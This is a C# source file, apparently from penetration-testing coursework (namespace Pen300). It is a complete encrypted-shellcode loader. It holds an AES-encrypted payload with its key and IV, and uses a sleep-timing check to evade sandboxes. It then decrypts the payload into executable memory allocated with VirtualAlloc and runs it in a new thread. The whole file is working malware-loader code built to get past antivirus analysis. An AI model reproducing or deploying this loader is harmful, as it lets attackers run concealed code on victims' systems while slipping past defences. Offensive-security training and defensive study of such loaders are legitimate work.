using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Pen300.CS
{
    public class ShellcodeExecution
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static byte[] Decrypt(byte[] encrypted, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                byte[] decrypted;

                using (MemoryStream msDecrypt = new MemoryStream(encrypted))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msPlain = new MemoryStream())
                        {
                            csDecrypt.CopyTo(msPlain);
                            decrypted = msPlain.ToArray();
                        }
                    }
                }

                return decrypted;
            }
        }

        public static void Main()
        {
            byte[] encrypted = new byte[] {
            0x72,0x66,0x52,0x0b,0xc9,0x1f,0x10,0x7a,0x88,0x2b,0x7b,0x9e,
            0xfb,0xff,0xad,0x94,0xbe,0x39,0xb2,0xa2,0xbe,0x5d,0x8f,0x5a,
            0xba,0x6b,0x02,0xf9,0x00,0x3c,0x0d,0x61,0xbe,0x95,0x17,0x86,
            0xa3,0x3c,0x89,0x11,0x0f,0x26,0x43,0x8a,0x17,0xa1,0xb5,0x7a,
            0x30,0x42,0x5f,0xde,0x1c,0x90,0x0d,0x16,0x1f,0xfd,0x56,0x4b,
            0x61,0xa6,0x3d,0xf6,0xb0,0xe6,0x04,0x58,0x80,0xf4,0x4d,0x80,
            0x77,0x51,0xc8,0xba,0x2a,0x85,0xd0,0x4f,0x95,0x2b,0xd3,0xaf,
            0x68,0xe9,0xfc,0x65,0x26,0xce,0xe9,0xe4,0xd5,0x46,0xf1,0x02,
            0x71,0xa6,0xf2,0x49,0x90,0xf8,0x34,0xb6,0x58,0x1d,0x17,0x9e,
            0x50,0x1e,0x35,0x0e,0x52,0x6e,0xe0,0xae,0xb3,0x05,0x70,0xfb,
            0xcb,0xb6,0x3e,0xa2,0xc1,0x45,0x4a,0xe0,0xd1,0x53,0xbc,0xd5,
            0xca,0xc6,0x4e,0xc1,0xf9,0xa6,0x9c,0x45,0xc8,0xa5,0x09,0x6f,
            0xfd,0x9e,0x4b,0x78,0xf2,0x32,0x65,0x7c,0x6d,0xa6,0x85,0x07,
            0x38,0xf7,0x89,0x5d,0x66,0xdd,0x29,0x50,0x68,0x87,0xe9,0xcd,
            0x48,0xfd,0xe4,0x20,0xcb,0xf7,0x82,0x54,0x17,0xd0,0xad,0xab,
            0x3b,0x7e,0x79,0x1a,0xd8,0x58,0x3d,0x8a,0x71,0x6f,0xb0,0x50,
            0xf4,0x99,0x78,0x54,0x55,0x40,0x63,0x09,0xf8,0x8b,0x83,0x5e,
            0xf5,0x80,0xf0,0x13,0xfc,0xd2,0x10,0xd2,0xde,0x1a,0xfe,0x54,
            0x80,0xb8,0x86,0xa1,0x82,0x05,0x43,0x44,0x42,0x1c,0x19,0x29,
            0x76,0xb4,0xe8,0x1c,0x5a,0x8c,0x63,0x9d,0x6b,0xcd,0x97,0xc2,
            0xd1,0x26,0x3a,0xa0,0x2f,0x5c,0xdb,0xc2,0x31,0xeb,0x31,0x33,
            0xe1,0x0a,0xb1,0x02,0x30,0xde,0x71,0x2f,0x25,0x6e,0x13,0xf2,
            0x97,0xfc,0x39,0xf2,0xea,0x72,0x72,0x40,0x44,0x27,0x2e,0x2a,
            0x4d,0x27,0x6c,0x2f,0xd6,0x52,0xa6,0xd9,0x6b,0x86,0x49,0xa8 };

            byte[] key = new byte[] {
            0xf6,0x92,0x07,0xe9,0x04,0xe1,0xb8,0x36,0x0b,0xf3,0xa7,0xb5,
            0x7d,0xcb,0x7f,0x1b,0x66,0x6d,0x76,0xb2,0x15,0xd5,0x19,0x82,
            0xb6,0x47,0x54,0x3e,0x24,0x85,0xe1,0x56 };

            byte[] iv = new byte[] {
            0xbc,0x49,0x5e,0xad,0x0b,0x85,0x73,0x3a,0x3c,0x0b,0x47,0x7d,
            0xfa,0x5f,0x1f,0x82 };

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] decrypted = Decrypt(encrypted, key, iv);

            int size = decrypted.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(decrypted, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}